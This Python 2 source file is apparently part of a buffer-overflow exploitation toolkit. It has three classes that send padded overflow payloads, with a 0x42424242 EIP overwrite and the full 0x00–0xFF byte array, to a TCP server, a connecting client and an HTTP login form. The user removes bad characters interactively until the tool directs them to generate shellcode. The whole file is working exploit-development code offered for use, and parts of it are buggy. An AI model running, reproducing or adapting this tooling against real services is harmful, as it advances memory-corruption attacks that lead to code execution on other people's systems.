#!/usr/bin/env python

import socket 
import time
import readline
import os
from Banner import *
import requests
from subprocess import check_output 


W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m" 

class Bad_Character:

       def __init__(self):
                        
            self.main()
       def HEX_array(self): 
             try:                
                 with open('.data','r')as data:
                        data_list = list(data)                        
                        self.server_ip = data_list[0]
                        self.server_port = data_list[1]
                        self.location = data_list[2]
                        self.server_ip =self.server_ip.replace('\n','') 
                        self.server_port =self.server_port.replace('\n','')
                 self.payload = ''    
                 self.payload +='A'*int(self.location)
                 self.payload += '\x42\x42\x42\x42'
                 time.sleep(1)
                 self.hex_num   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256))
                 self.shell_hex = "".join('\n"%s"'%self.hex_num[i:i+56] for i in range(0, len(self.hex_num),56))
                 time.sleep(1)  
                 with open ('txt','w')as hex_1:
                    self.hex_0 = hex_1.write(self.shell_hex) 
                 with open('txt','r')as data_hex:
                      self.hex_x = data_hex.read() 
                      print (O+'='*50+W)
                      print O+'\n[+] HEX array is  Created'+W
                      print R+self.hex_x+W 
                      print (O+'='*50+W)   
                      time.sleep(2)             
                 print Y+"\n[+] "+W+B+"Conncet Server Ip "+W+O+"    : "+W, P+self.server_ip+W
                 time.sleep(2)
                 print Y+"\n[+] "+W+B+"Conncet Server Port "+W+O+"  : "+W, P+str(self.server_port)+W
                 time.sleep(1)
                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                 time.sleep(2)
                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                 self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                 with open('textarray','w') as array_1 :
                      file1 = self.hex_num_send.replace('\\x','')
                      self.array = array_1.write(file1)
                 with open('textarray','r')as readarray :
                      self.file1 = readarray.read()                      
                      self.file = self.file1.decode('hex')   
                                                            
             except KeyboardInterrupt:
                    print Banner
                    exit() 
       def input_hex(self):
          try :
               list_add = []
               self.hex_input  = str(raw_input(O+"\n[%]"+W+B+"Enter the Hex Number Badchar"+W+O+" :"+W))                
               if self.hex_input not in list_add:
                   list_add.append(self.hex_input)
               else:
                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
                  time.sleep(2) 
                  return self.input_hex()            
               if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                    self.input_send = self.hex_x.replace(self.hex_input,'')
               else:
                  time.sleep(2) 
                  print P+"\n[!] bad input order [!]"+W 
                  time.sleep(2)    
                  print R+"\n[#] Enter the Number in hexadecimal value "+W
                  return self.input_hex()
          except KeyboardInterrupt:
                   print Banner
                   exit()                                                                                                                        
       def HEX_FORMAT(self): 
            
             try:                           
                
                    with open ('txt','w')as hex_1:
                          self.hex_0 = hex_1.write(self.input_send) 
                    with open('txt','r')as data_hex:
                          self.hex_x = data_hex.read() 
                          print (O+'='*50+W)
                          print O+'\n[+] HEX array is Created with out '+W,P+self.hex_input+W
                          print R+self.hex_x+W 
                          print (O+'='*50+W)
                          time.sleep(2)
                    self.hex_input1=self.hex_input.replace('\\x','')
                    if self.hex_input1 in self.file1:
                       self.hex_input2 =  self.file1.replace(self.hex_input1,'') 
                       with open('textarray','w') as array_1 :
                            self.array = array_1.write(self.hex_input2)                  
                       with open('textarray','r')as readarray :
                            self.file1 = readarray.read()                      
                            self.file = self.file1.decode('hex')                                                                 
                    else:                       
                        print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W
                        time.sleep(2) 
                        self.input_hex()                                               
                        self.HEX_FORMAT()                                               
                        
             except KeyboardInterrupt:
                   print Banner
                   exit()                        
       def _SOCKET_SOCKET(self):
              try:
                 try:
                    _socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    _socket.connect((str(self.server_ip),int( self.server_port)))
                    _socket.settimeout(6)
                    _socket.send(self.payload+self.file+'\r\n') 
                    _socket.recv(1023)
                    _socket.close()
                    time.sleep(2)
                    print O+'\n|++++++ '+W+Y+"Data **** Send "+W+O+' ++++++|'+W 
                 except socket.error:
                    print  O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"_***_***"+W
                    self.input_hex() 
                    if os.path.exists('txt') :
                      self._SOCKET_SOCKET()                               
              except KeyboardInterrupt:
                print Banner
                exit()
                                       
       def main(self):
          self.HEX_array() 
          self._SOCKET_SOCKET()
          list=[]         
          while True:
            try:     
              self.out_q = 'q'.lower() 
              self.continue_skip = 'd'.lower()                     
              time.sleep(2)  
              self.input_hex()          
              self.HEX_FORMAT()
              self._SOCKET_SOCKET()
              def select():       
                 self.out = str(raw_input(P+"\n[*] "+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
                 if self.hex_input not in list :
                     list.append(self.hex_input) 
                 if self.out == self.out_q and len(self.out)==1 :                
                    print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
                    time.sleep(2)
                    print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
                    time.sleep(2)
                    print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                    os.remove('txt')
                    os.remove('textarray') 
                    try:
                       host_ip   = check_output(['hostname', '--all-ip-addresses'],shell=True,stderr=subprocess.PIPE).decode('utf8').replace('\n','')
                       with open('.data','a') as append:
                           append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n')))  
                    except Exception:
                            host_ip = str(raw_input(O+"\n[%]"+W+B+"Enter Local ip "+W+O+" :"+W))  
                            with open('.data','a') as append:
                                append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n'))) 
                 elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
                    pass  
                 else:
                   time.sleep(2)
                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
                   time.sleep(2)
                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
                   return select()  
              select()                    
              if self.out == self.out_q :
                break                          
            except KeyboardInterrupt:
                 print Banner
                 exit()
if __name__ =='__main__':

  Bad_Character()
  

class Bad_Character_Clinet:

       def __init__(self):
                         
            self.main()
       def Listen_FAKE(self):
                          
          try: 
              with open('.data','r')as data:
                   data_list      = list(data)                        
                   self.port      = data_list[0]            
              self.ip_server = "0.0.0.0"
              self.listen_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              self.listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              self.listen_sock.bind((self.ip_server,int(self.port)))
              self.listen_sock.listen(1)
              time.sleep(1)
              print Y+"\n\r\r!---___"+W+R+ "Wating For incoming Connection"+W+Y+'___---!'+W 
          except socket.error, exc:               
                time.sleep(1)
                print Y+"\n\r\r!---___"+W+P+ "Socket.Error "+W+O+"%s " %exc+W+Y+'___---!'+W
                time.sleep(1) 
                print Banner      
                exit()
          except KeyboardInterrupt:  
                 print Banner      
                 exit()     
       def HEX_array(self): 
             try: 
                 with open('.data','r')as data:
                      data_list      = list(data)                        
                      self.port      = data_list[0] 
                      self.location  = data_list[1]               
                 self.payload = ''    
                 self.payload +='A'*int(self.location)
                 self.payload += '\x42\x42\x42\x42'
                 time.sleep(1)
                 self.hex_num   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256))
                 self.shell_hex = "".join('\n"%s"'%self.hex_num[i:i+56] for i in range(0, len(self.hex_num),56))
                 time.sleep(1)  
                 with open ('txt','w')as hex_1:
                    self.hex_0 = hex_1.write(self.shell_hex) 
                 with open('txt','r')as data_hex:
                      self.hex_x = data_hex.read() 
                      print (O+'='*50+W)
                      print O+'\n[+] HEX array is  Created'+W
                      print R+self.hex_x+W 
                      print (O+'='*50+W)   
                      time.sleep(2)             
                 print Y+"\n[+] "+W+B+"Server Listein  Ip "+W+O+"   : "+W, P+'0.0.0.0'+W
                 time.sleep(1)
                 print Y+"\n[+] "+W+B+"Server Listein Port "+W+O+"  : "+W, P+self.port+W
                 time.sleep(1)
                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                 time.sleep(1)
                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                 self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                 with open('textarray','w') as array_1 :
                      file1 = self.hex_num_send.replace('\\x','')
                      self.array = array_1.write(file1)
                 with open('textarray','r')as readarray :
                      self.file1 = readarray.read()                      
                      self.file = self.file1.decode('hex')   
                                                            
             except KeyboardInterrupt:
                    print Banner
                    exit() 
       def input_hex(self):
          try :
               list_add = []
               self.hex_input  = str(raw_input(O+"\n[%]"+W+B+"Enter the Hex Number Badchar"+W+O+" :"+W))                 
               if self.hex_input not in list_add:
                  list_add.append(self.hex_input)                
               else:
                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
                  time.sleep(1) 
                  self.input_hex()                 
               if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                    self.input_send = self.hex_x.replace(self.hex_input,'')
               else:
                  time.sleep(1) 
                  print Y+"\n\r\r!---___"+W+R+ "Bad Input Format '\\xx' hexadecimal value"+W+Y+'___---!'+W 
                  time.sleep(1)    
                  self.input_hex()
          except KeyboardInterrupt:
                   print Banner
                   exit()                                                                                                                        
       def HEX_FORMAT(self): 
            
             try:                           
                
                    with open ('txt','w')as hex_1:
                          self.hex_0 = hex_1.write(self.input_send) 
                    with open('txt','r')as data_hex:
                          self.hex_x = data_hex.read() 
                          print (O+'='*50+W)
                          print O+'\n[+] HEX array is Created with out '+W,P+self.hex_input+W
                          print R+self.hex_x+W 
                          print (O+'='*50+W)
                          time.sleep(2)
                    self.hex_input1=self.hex_input.replace('\\x','')
                    if self.hex_input1 in self.file1:
                       self.hex_input2 =  self.file1.replace(self.hex_input1,'') 
                       with open('textarray','w') as array_1 :
                            self.array = array_1.write(self.hex_input2)                  
                       with open('textarray','r')as readarray :
                            self.file1 = readarray.read()                      
                            self.file = self.file1.decode('hex')                                                                 
                    else:                       
                        print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W
                        time.sleep(1) 
                        self.input_hex()                                               
                        self.HEX_FORMAT()
             except KeyboardInterrupt:
                   print Banner
                   exit()
       def send(self): 
             try:                                                                                            
                 client , addr = self.listen_sock.accept()
                 client.settimeout(10)
                 print Y+"\n[(-)]"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+"[(+)]"+W 
                 client.settimeout(3)
                 while True:
                        try:          
		           client.sendall(self.payload +self.file +'\r\n')		        		 	       
                        except Exception:
                           print B+"\n[+]"+W+P+"Bad Characters Hex Array Send !!"+W+B+"[+]"+W 
                           time.sleep(2)        
                           break
             except KeyboardInterrupt:
                   Banner  
                   exit()         
                                       
       def main(self):
          self.HEX_array()  
          self.Listen_FAKE()
          self.send()
          list=[]         
          while True:
            try:     
              self.out_q = 'q'.lower() 
              self.continue_skip = 'd'.lower()                     
              time.sleep(1)  
              self.input_hex() 
              self.HEX_FORMAT()         
              self.Listen_FAKE()
              self.send()
              def select():       
                 self.out = str(raw_input(P+"\n[*] "+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
                 if self.hex_input not in list :
                     list.append(self.hex_input) 
                 if self.out == self.out_q and len(self.out)==1 :                
                    print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
                    time.sleep(2)
                    print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
                    time.sleep(2)
                    print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                    os.remove('txt')
                    os.remove('textarray') 
                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
                    with open('.data','a') as append:
                        append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n')))                              
                 elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
                    pass  
                 else:
                   time.sleep(2)
                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
                   time.sleep(2)
                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
                   return select()  
              select()                    
              if self.out == self.out_q :
                 self.listen_sock.close()
                 break                          
            except KeyboardInterrupt:
                 print Banner
                 exit()
if __name__ =='__main__':

  Bad_Character_Clinet()  
  


class Bad_Character_HTTP:
      
       def __init__(self):
                                    
            self.main()
       def HEX_array(self): 
             try:                
                 with open('.data','r')as data:
                        data_list = list(data)                        
                        self.target_url = data_list[0]
                        self.location = data_list[1]
                        self.target_url =self.target_url.replace('\n','') 
                 self.payload = ''    
                 self.payload +='A'*int(self.location)
                 self.payload += '\x42\x42\x42\x42'
                 time.sleep(1)
                 self.hex_num   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256))
                 self.shell_hex = "".join('\n"%s"'%self.hex_num[i:i+56] for i in range(0, len(self.hex_num),56))
                 time.sleep(1)  
                 with open ('txt','w')as hex_1:
                    self.hex_0 = hex_1.write(self.shell_hex) 
                 with open('txt','r')as data_hex:
                      self.hex_x = data_hex.read() 
                      print (O+'='*50+W)
                      print O+'\n[+] HEX array is  Created'+W
                      print R+self.hex_x+W 
                      print (O+'='*50+W)   
                      time.sleep(2)             
                 print Y+"\n[+] "+W+B+"HTTP Login Page "+W+O+"    : "+W, P+self.target_url+W
                 time.sleep(2)
                 print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
                 time.sleep(2)
                 print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                 self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                 with open('textarray','w') as array_1 :
                      file1 = self.hex_num_send.replace('\\x','')
                      self.array = array_1.write(file1)
                 with open('textarray','r')as readarray :
                      self.file1 = readarray.read()                      
                      self.file = self.file1.decode('hex')   
                                                            
             except KeyboardInterrupt:
                    print Banner
                    exit() 
       def input_hex(self):
          try :
               list_add = []
               self.hex_input  = str(raw_input(O+"\n[%] "+W+B+"Enter the Hex Number Badchar"+W+O+" :"+W))                  
               if self.hex_input not in list_add:
                  list_add.append(self.hex_input)
               else:
                  print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W  
                  time.sleep(2) 
                  return self.input_hex()               
               if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                    self.input_send = self.hex_x.replace(self.hex_input,'')
               else:
                  time.sleep(2) 
                  print P+"\n[!] bad input order [!]"+W 
                  time.sleep(2)    
                  print R+"\n[#] Enter the Number in hexadecimal value "+W
                  return self.input_hex()
          except KeyboardInterrupt:
                   print Banner
                   exit()                                                                                                                        
       def HEX_FORMAT(self): 
            
             try:                           
                
                    with open ('txt','w')as hex_1:
                          self.hex_0 = hex_1.write(self.input_send) 
                    with open('txt','r')as data_hex:
                          self.hex_x = data_hex.read() 
                          print (O+'='*50+W)
                          print O+'\n[+] HEX array is Created with out '+W,P+self.hex_input+W
                          print R+self.hex_x+W 
                          print (O+'='*50+W)
                          time.sleep(2)
                    self.hex_input1=self.hex_input.replace('\\x','')
                    if self.hex_input1 in self.file1:
                       self.hex_input2 =  self.file1.replace(self.hex_input1,'') 
                       with open('textarray','w') as array_1 :
                            self.array = array_1.write(self.hex_input2)                  
                       with open('textarray','r')as readarray :
                            self.file1 = readarray.read()                      
                            self.file = self.file1.decode('hex')                                                                 
                    else:                       
                        print P+"\n[?]the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W
                        time.sleep(2) 
                        self.input_hex()                                               
                        self.HEX_FORMAT()                                               
                       
             except KeyboardInterrupt:
                   print Banner
                   exit()                                    
                  
       def connect_login(self):
          try:
             try:
               session = requests.session()
               response = session.get(self.target_url,timeout=5)
               if response.ok == True:
     	           while True:
                      try:
                          session  = requests.session()
                          username = self.payload+self.file
                          username1=username.replace('\n','')
                          username2=username1.replace('\n','')
                          password = 'admin' 
                          data={ 
                          'username': '{}'.format(username2),
                          'password':'{}'.format(password),
                          'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                          }
                          response = session.post(self.target_url,data=data,timeout=3)
                          
                      except :
                 	   print O+'\n|++++++ '+W+Y+"Data **** Send "+W+O+' ++++++|'+W 
                 	   time.sleep(2)
                 	   break
             except requests.exceptions.ReadTimeout:      
                 print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"_***_***"+W 
                 if os.path.exists('txt') :  
                    self.input_hex()               
                    self.connect_login() 
                    	     
          except KeyboardInterrupt:
            print  Banner
            exit()
                                       
       def main(self):
          self.HEX_array() 
          self.connect_login()
          list=[]         
          while True:
            try:     
              self.out_q = 'q'.lower() 
              self.continue_skip = 'd'.lower()                     
              time.sleep(2)  
              self.input_hex()          
              self.HEX_FORMAT()
              self.connect_login()
              def select():       
                 self.out = str(raw_input(P+"\n[*]"+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
                 if self.hex_input not in list :
                     list.append(self.hex_input) 
                 if self.out == self.out_q and len(self.out)==1 :                
                    print Y+"\n[#]"+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
                    time.sleep(2)
                    print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
                    time.sleep(2)
                    print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                    os.remove('txt')
                    os.remove('textarray')   
                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
                    with open('.data','a') as append:                     
                       append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n')))                  
                 elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
                    pass  
                 else:
                   time.sleep(2)
                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
                   time.sleep(2)
                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
                   return select()  
              select()                    
              if self.out == self.out_q :
                break                          
            except KeyboardInterrupt:
                 print Banner
                 exit()
if __name__ =='__main__':

   Bad_Character_HTTP()


